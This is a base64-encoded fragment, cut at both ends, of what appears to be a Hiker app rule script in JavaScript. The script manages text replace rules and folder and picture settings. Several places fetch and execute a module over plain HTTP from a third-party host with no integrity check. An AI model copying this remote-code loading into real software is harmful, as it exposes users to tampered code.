uICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+S/ruaUueaIkOWKn1xcXCI7XFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCByZXF1aXJlVXJsID0gXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGZpbGVTZWxlY3QgPSAkLnJlcXVpcmUocmVxdWlyZVVybCk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmlsZVNlbGVjdC5maWxlU2VsZWN0aW9uVXJpKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjazogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBDb25maWcgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIDApIHx8IFxcXCJ7fVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuZGVmX1BpYyA9IFxcXCJmaWxlOi8vXFxcIiArIFBBVEg7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNhdmVGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiOmRlZmF1bHRQaWNCYWNrXFxcIiwgXFxcInRydWVcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5L+u5pS55oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxlVHlwZTogXFxcIi5qcGd8LmpwZWd8LmdpZnwucG5nfC5zdmd8LmJtcFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DbGlja1R5cGU6IFxcXCJjb25maXJtXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBzdG9yZTogXFxcInNlbGVjdFBhdGhDYWNoZTJcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG1lbW9yeVBhdGg6IHRydWVcXG4gICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSk7XFxuICAgICAgICBicmVhaztcXG4gICAgY2FzZSBcXFwicmVwbGFjZVJ1bGVcXFwiOlxcbiAgICAgICAgaWYgKE1ZX1BBUkFNUy5pc1JlZnJlc2gpIHtcXG4gICAgICAgICAgICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4gcmVmcmVzaFBhZ2UoKSkpO1xcbiAgICAgICAgfVxcbiAgICAgICAgc2V0UGFnZVRpdGxlKFxcXCLmm7/mjaLop4TliJl86K6+572uXFxcIik7XFxuICAgICAgICBsZXQgcnVsZUxpc3QgPSBbXTtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgY29uZmlybSh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiAn6ZSZ6K+v5o+Q56S6JyxcXG4gICAgICAgICAgICAgICAgY29udGVudDogJ+abv+aNouaVsOaNruivu+WPluWksei0pe+8jOaYr+WQpuWIneWni+WMlu+8n1xcXFxu6K+l5pON5L2c5Lya5riF6Zmk5L2g55qE5pu/5o2i5pWw5o2uISEhJyxcXG4gICAgICAgICAgICAgICAgY29uZmlybTogJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVGaWxlKFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICB0b2FzdChcXFwi5Yid5aeL5YyW5a6M5oiQXFxcIik7XFxuICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgLy90b2FzdChcXFwi5Y+W5raIXFxcIik7XFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgIH1cXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuaWsOW7uuabv+aNolxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2VkaXRSZXBsYWNlUnVsZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjP2lzTmV3PXRydWVcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLlr7zlh7rop4TliJlcXFwiLFxcbiAgICAgICAgICAgIHVybDogJChcXFwi56Gu6K6k5a+85Ye6XFxcIiArIHJ1bGVMaXN0Lmxlbmd0aCArIFxcXCLmnaHop4TliJnvvJ9cXFxcbih7aG9tZVB0YWh9L3JlcGxhY2VSdWxlLmpzb24pXFxcIikuY29uZmlybSgobnVtKSA9PiB7XFxuICAgICAgICAgICAgICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICBsZXQgc2F2ZVB0YSA9IENvbmZpZy5ob21lUGF0aCArIFxcXCIvcmVwbGFjZVJ1bGUuanNvblxcXCI7XFxuICAgICAgICAgICAgICAgIHdyaXRlRmlsZShzYXZlUHRhLCByZWFkRmlsZShcXFwicmVwbGFjZVJ1bGUuanNvblxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgICAgICBsb2coXFxcIlxcXFxu6Lev5b6E77yaXFxcIiArIHNhdmVQdGEgKyBcXFwiXFxcXG7lr7zlh7rop4TliJkgXFxcIiArIG51bSArIFxcXCIg5p2hXFxcIik7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwic2hhcmU6Ly9cXFwiICsgc2F2ZVB0YTtcXG4gICAgICAgICAgICB9LCBydWxlTGlzdC5sZW5ndGgpLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIlxcbiAgICAgICAgfSk7XFxuXFxuICAgICAgICBmdW5jdGlvbiBpbXBvcnRSdWxlKGlzYmFjaykge1xcbiAgICAgICAgICAgIGlucHV0ID0gdHlwZW9mIFBBVEggPT09IFxcXCJ1bmRlZmluZWRcXFwiID8gaW5wdXQgOiBQQVRIO1xcbiAgICAgICAgICAgIGlucHV0ID0gaW5wdXQuc3RhcnRzV2l0aChcXFwiZmlsZTovL1xcXCIpID8gaW5wdXQgOiBcXFwiZmlsZTovL1xcXCIgKyBpbnB1dFxcbiAgICAgICAgICAgIGxldCBydWxlVGV4dCA9IHJlcXVlc3QoaW5wdXQpO1xcbiAgICAgICAgICAgIGlmICghcnVsZVRleHQpIHJldHVybiBcXFwidG9hc3Q6Ly/ojrflj5bmlofku7bkuLrnqbpcXFwiO1xcbiAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgIGxldCBuZXdSdWxlTGlzdCA9IEpTT04ucGFyc2UocnVsZVRleHQpO1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZUxpc3QgPSBKU09OLnBhcnNlKHJlYWRGaWxlKFxcXCJyZXBsYWNlUnVsZS5qc29uXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgICAgICAgICAgICAgIGxldCBuZXdDb3VudCA9IDAsXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVDb3VudCA9IDA7XFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgaW4gbmV3UnVsZUxpc3QpIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuZXdSdWxlID0gbmV3UnVsZUxpc3RbaV07XFxuICAgICAgICAgICAgICAgICAgICBpZiAoIW5ld1J1bGUuaGFzT3duUHJvcGVydHkoXFxcInJlcGxhY2VtZW50XFxcIikgfHwgIW5ld1J1bGUuaGFzT3duUHJvcGVydHkoXFxcInBhdHRlcm5cXFwiKSB8fCAhbmV3UnVsZS5oYXNPd25Qcm9wZXJ0eShcXFwibmFtZVxcXCIpIHx8IChuZXdSdWxlLnNjb3BlQ29udGVudCA9PT0gdW5kZWZpbmVkID8gZmFsc2UgOiAhbmV3UnVsZS5zY29wZUNvbnRlbnQpKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBsZXQgaWQgPSBuZXdSdWxlLmlkO1xcbiAgICAgICAgICAgICAgICAgICAgbmV3UnVsZS5pZCA9IGlkIHx8IG5ldyBEYXRlKCkuZ2V0VGltZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGlkSW5kZXggPSBydWxlTGlzdC5maW5kSW5kZXgocnVsZSA9PiBydWxlLmlkID09PSBpZCk7XFxuICAgICAgICAgICAgICAgICAgICBpZiAoaWRJbmRleCA+IC0xKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlQ291bnQrKztcXG4gICAgICAgICAgICAgICAgICAgICAgICBydWxlTGlzdC5zcGxpY2UoaWRJbmRleCwgMSwgbmV3UnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIG5ld0NvdW50Kys7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcnVsZUxpc3QucHVzaChuZXdSdWxlKTtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBzYXZlRmlsZShcXFwicmVwbGFjZVJ1bGUuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KHJ1bGVMaXN0KSk7XFxuICAgICAgICAgICAgICAgIGlmIChpc2JhY2spIHtcXG4gICAgICAgICAgICAgICAgICAgIGJhY2soKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgbG9nKFxcXCJcXFxcbui3r+W+hO+8mlxcXCIgKyBpbnB1dCArIFxcXCJcXFxcbuaAu+inhOWImeaVsO+8mlxcXCIgKyBuZXdSdWxlTGlzdC5sZW5ndGggKyBcXFwiXFxcXG7mm7TmlrDop4TliJkgXFxcIiArIHVwZGF0ZUNvdW50ICsgXFxcIiDmnaFcXFxcdOaWsOWinuinhOWImSBcXFwiICsgbmV3Q291bnQgKyBcXFwiIOadoVxcXCIpO1xcbiAgICAgICAgICAgICAgICB0b2FzdChcXFwi5a+85YWl5oiQ5YqfXFxcIik7XFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXG4gICAgICAgICAgICAgICAgaWYgKGlzYmFjaykgYmFjaygpO1xcbiAgICAgICAgICAgICAgICB0b2FzdChcXFwi5a+85YWl5aSx6LSlXFxcIik7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5a+85YWl6KeE5YiZXFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoW1xcXCLlpJbpg6jmlofku7ZcXFwiLCBcXFwi5YaF6YOo5paH5Lu2XFxcIl0sIDEsIFxcXCLop4TliJnlr7zlhaVcXFwiKS5zZWxlY3QoKGltcG9ydFJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0ID09PSBcXFwi5aSW6YOo5paH5Lu2XFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJmaWxlU2VsZWN0Oi8vXFxcIiArICQudG9TdHJpbmcoaW1wb3J0UnVsZSk7XFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgcmVxdWlyZVVybCA9IFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD01MDk5XFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBmaWxlU2VsZWN0ID0gcmVxdWlyZShyZXF1aXJlVXJsKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBmaWxlU2VsZWN0LmZpbGVTZWxlY3Rpb25Vcmkoe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrOiAkLnRvU3RyaW5nKGltcG9ydFJ1bGUsIHRydWUpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVpcmVVcmw6IHJlcXVpcmVVcmwsXFxuICAgICAgICAgICAgICAgICAgICAgICAgZmlsZVR5cGU6IFxcXCIuanNvblxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DbGlja1R5cGU6IFxcXCJjb25maXJtXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBtZW1vcnk6IFxcXCJzZWxlY3RQYXRoQ2FjaGVcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0sIGltcG9ydFJ1bGUpLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBmb3IgKGxldCBpID0gMCwgbGVuID0gcnVsZUxpc3QubGVuZ3RoOyBpIDwgbGVuOyBpKyspIHtcXG4gICAgICAgICAgICBsZXQgcmVwbGFjZVJ1bGUgPSBydWxlTGlzdFtpXTtcXG4gICAgICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiByZXBsYWNlUnVsZS5uYW1lLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgY2xzOiBpZCArIFxcXCIuXFxcIiArIGksXFxuICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLliKDpmaRcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKGlkLCBpbmRleCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgdmFyIHJ1bGVMaXN0ID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwicmVwbGFjZVJ1bGUuanNvblxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGcgPSBydWxlTGlzdC5zcGxpY2UoaW5kZXgsIDEpO1xcblxcbiAgICAgICAgICAgICAgICAgICAgc2F2ZUZpbGUoXFxcInJlcGxhY2VSdWxlLmpzb25cXFwiLCBKU09OLnN0cmluZ2lmeShydWxlTGlzdCkpO1xcbiAgICAgICAgICAgICAgICAgICAgLy9kZWxldGVJdGVtQnlDbHMoaWQgKyBcXFwiLlxcXCIgKyBpbmRleCk7XFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgICAgICAgICB0b2FzdChcXFwi5Yig6Zmk5oiQ5YqfXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgICB9LCBpZCwgaSksXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcIi5cXFwiICsgaVxcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMlxcXCJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi57yW6L6RXFxcIixcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL2VkaXRSZXBsYWNlUnVsZS52aWV3I25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5IyNub1JlZnJlc2gjP2luZGV4PVxcXCIgKyBpLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMlxcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcIi5cXFwiICsgaVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgY2xzOiBpZCArIFxcXCIuXFxcIiArIGlcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgXFxcImNvbnRlbnRzXFxcIjpcXG4gICAgICAgIGxldCBmID0gcmVxdWlyZShcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXCIpO1xcbiAgICAgICAgc2V0UGFnZVRpdGxlKFxcXCLnm67lvZXorr7nva586K6+572uXFxcIik7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLpgInmi6nmlofku7blpLlcXFwiLFxcbiAgICAgICAgICAgIHVybDogSlNPTi5zdHJpbmdpZnkoZi5maWxlU2VsZWN0aW9uVXJpKHtcXG4gICAgICAgICAgICAgICAgY2FsbGJhY2s6ICQudG9TdHJpbmcoKGlkKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGFyZ2V0ID0gZmluZEl0ZW0oaWQpLmV4dHJhO1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShpZCwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiBPYmplY3QuYXNzaWduKHRhcmdldCwge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0VmFsdWU6IFBBVEhcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICAgICAgICAgICAgfSwgaWQpLFxcbiAgICAgICAgICAgICAgICBpbml0aWFsUGF0aDogQ29uZmlnLmhvbWVQYXRoLFxcbiAgICAgICAgICAgICAgICByZXF1aXJlVXJsOiBcXFwiaHR0cDovL2hpa2VyLm5va2lhLnByZXNzL2hpa2VydWxlL3J1bGVsaXN0Lmpzb24/aWQ9NTA5OVxcXCIsXFxuICAgICAgICAgICAgICAgIHBhdHRlcm46IDFcXG4gICAgICAgICAgICB9KSksXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICAgICAgZGVzYzogXFxcIuaUr+aMgWhpa2VyOi8vZmlsZXPot6/lvoQo6K+l5pON5L2c5LiN5Lya5Yid5aeL5YyW55uu5b2VKVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBDb25maWcuaG9tZVBhdGgsXFxuICAgICAgICAgICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKChpZCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoaWQsIGlucHV0KTtcXG4gICAgICAgICAgICAgICAgfSwgaWQpLFxcbiAgICAgICAgICAgICAgICBpZDogaWRcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxuICAgICAgICB9KTtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuehruiupFxcXCIsXFxuICAgICAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChpZCkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgaW5wdXQgPSBnZXRNeVZhcihpZCwgZmluZEl0ZW0oaWQpLmV4dHJhLmRlZmF1bHRWYWx1ZSB8fCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgIGNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICBpZiAoaW5wdXQuc3RhcnRzV2l0aChcXFwiaGlrZXI6Ly9maWxlcy9cXFwiKSkgaW5wdXQgPSBnZXRQYXRoKGlucHV0KS5zbGljZSg3KTtcXG4gICAgICAgICAgICAgICAgaWYgKGlucHV0LmVuZHNXaXRoKFxcXCIvXFxcIikpIGlucHV0ID0gaW5wdXQucmVwbGFjZSgvXFxcXC8kLywgXFxcIlxcXCIpO1xcbiAgICAgICAgICAgICAgICBpZiAoQ29uZmlnLmhvbWVQYXRoID09IGlucHV0KSByZXR1cm4gXFxcInRvYXN0Oi8v5bey57uP5piv5b2T5YmN55uu5b2VXFxcIjtcXG4gICAgICAgICAgICAgICAgQ29uZmlnID0gSlNPTi5wYXJzZShyZWFkRmlsZShcXFwiY29uZmlnLmpzb25cXFwiLCAwKSB8fCBcXFwie31cXFwiKTtcXG4gICAgICAgICAgICAgICAgQ29uZmlnLmhvbWVQYXRoID0gaW5wdXQ7XFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKFxcXCJjb25maWcuanNvblxcXCIsIEpTT04uc3RyaW5naWZ5KENvbmZpZyksIDApO1xcbiAgICAgICAgICAgICAgICBiYWNrKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7Lkv53lrZhcXFwiO1xcbiAgICAgICAgICAgIH0sIGlkKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgfSk7XFxuXFxuICAgICAgICBicmVhaztcXG59XFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi7nvJbovpHmm7/mjaLop4TliJlcIixcInBhdGhcIjpcImVkaXRSZXBsYWNlUnVsZS52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5jb25zdCBpc05ldyA9IE1ZX1BBUkFNUy5pc05ldyB8fCBnZXRQYXJhbShcXFwiaXNOZXdcXFwiKTtcXG5jb25zdCBpbmRleCA9IE1ZX1BBUkFNUy5pbmRleCB8fCBOdW1iZXIoZ2V0UGFyYW0oXFxcImluZGV4XFxcIikpO1xcbmxldCBsYXlvdXQgPSBbXTtcXG5hZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICBjbGVhck15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLm5hbWVcXFwiKTtcXG4gICAgY2xlYXJNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5pc1JlZ2V4XFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUucGF0dGVyblxcXCIpO1xcbiAgICBjbGVhck15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLnJlcGxhY2VtZW50XFxcIik7XFxuICAgIGNsZWFyTXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUuZmlyc3RcXFwiKTtcXG4gICAgLy9jbGVhck15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLnNjb3BlXFxcIik7XFxufSkpO1xcbmxldCBydWxlTGlzdCA9IEpTT04ucGFyc2UocmVhZEZpbGUoXFxcInJlcGxhY2VSdWxlLmpzb25cXFwiKSB8fCBcXFwiW11cXFwiKTtcXG5sZXQgaWQgPSBcXFwiI1xcXCIgKyBuZXcgRGF0ZSgpLmdldFRpbWUoKTtcXG4vL2xldCByZXBsYWNlUnVsZSA9IGlzTmV3ID09IFxcXCJ0cnVlXFxcIj97fTpydWxlTGlzdFtpbmRleF07XFxuaWYgKGlzTmV3ID09IFxcXCJ0cnVlXFxcIikge1xcbiAgICByZXBsYWNlUnVsZSA9IHtcXG4gICAgICAgIGlkOiBuZXcgRGF0ZSgpLmdldFRpbWUoKSxcXG4gICAgICAgIGlzUmVnZXg6IGZhbHNlLFxcbiAgICB9XFxufSBlbHNlIHtcXG4gICAgcmVwbGFjZVJ1bGUgPSBydWxlTGlzdFtpbmRleF07XFxufVxcbi8v6aaW5qyh5Yid5aeL5YyWXFxuaWYoZ2V0TXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUuZmlyc3RcXFwiLFxcXCJcXFwiKT09XFxcIlxcXCIpe1xcbiAgICBwdXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5pc1JlZ2V4XFxcIiwgXFxcIlxcXCIgKyByZXBsYWNlUnVsZS5pc1JlZ2V4KTtcXG4gICAgcHV0TXlWYXIoXFxcIi5lZGl0UmVwbGFjZVJ1bGUuZmlyc3RcXFwiLFxcXCIxXFxcIik7XFxufVxcbmxheW91dC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCLmi7fotJ1cXFwiLFxcbiAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgbGV0IGF0dCA9IFtcXFwibmFtZVxcXCIsIFxcXCJpc1JlZ2V4XFxcIiwgXFxcInBhdHRlcm5cXFwiLCBcXFwicmVwbGFjZW1lbnRcXFwiXTtcXG4gICAgICAgIGxldCBqc29uID0ge307XFxuICAgICAgICBhdHQuZm9yRWFjaChrZXkgPT4ge1xcbiAgICAgICAgICAgIGxldCB2YWx1ZSA9IGdldE15VmFyKFxcXCIuZWRpdFJlcGxhY2VSdWxlLlxcXCIgKyBrZXksIFxcXCJcXFwiKTtcXG4gICAgICAgICAgICBpZiAoa2V5ID09PSBcXFwiaXNSZWdleFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgdmFsdWUgPSB2YWx1ZSA9PT0gXFxcInRydWVcXFwiID8gdHJ1ZSA6IGZhbHNlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBqc29uW2tleV0gPSB2YWx1ZTtcXG4gICAgICAgIH0pO1xcbiAgICAgICAgY29weShKU09OLnN0cmluZ2lmeShqc29uKSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICB9KSxcXG4gICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiXFxufSk7XFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogXFxcIueymOi0tFxcXCIsXFxuICAgIHVybDogJChcXFwie3tjbGlwYm9hcmR9fVxcXCIpLmlucHV0KCgpID0+IHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgbGV0IGpzb24gPSBKU09OLnBhcnNlKGlucHV0KTtcXG4gICAgICAgICAgICBpZiAoQXJyYXkuaXNBcnJheShqc29uKSB8fCBqc29uLnBhdHRlcm4gPT0gdW5kZWZpbmVkKSByZXR1cm47XFxuICAgICAgICAgICAgbGV0IGF0dCA9IFtcXFwibmFtZVxcXCIsIFxcXCJpc1JlZ2V4XFxcIiwgXFxcInBhdHRlcm5cXFwiLCBcXFwicmVwbGFjZW1lbnRcXFwiXTtcXG4gICAgICAgICAgICBhdHQuZm9yRWFjaChrZXkgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiLmVkaXRSZXBsYWNlUnVsZS5cXFwiICsga2V5LCBTdHJpbmcoanNvbltrZXldKSk7XFxuICAgICAgICAgICAgfS